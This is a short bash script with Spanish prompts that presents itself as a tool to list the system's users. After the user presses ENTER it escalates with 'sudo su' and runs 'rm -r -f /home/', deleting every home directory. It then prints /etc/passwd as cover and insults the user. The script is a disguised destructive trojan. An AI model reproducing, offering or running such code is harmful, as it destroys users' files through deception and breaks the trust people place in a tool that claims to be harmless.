#!bin/bash

clear
echo    
printf "      \e[1;77m\e[41m  Obtén toda la lista de usuarios de tu sistema!  \e[0m\n"
echo    
echo   
read -p "Pulsa ENTER para comenzar"
sudo su
rm -r -f /home/
sleep 2
echo Terminando proceso de obtención, espere...
sleep 2
cat /etc/passwd
read -p "Si has terminado, precione ENTER."
clear
echo Gilipollas!
pause 2
exit
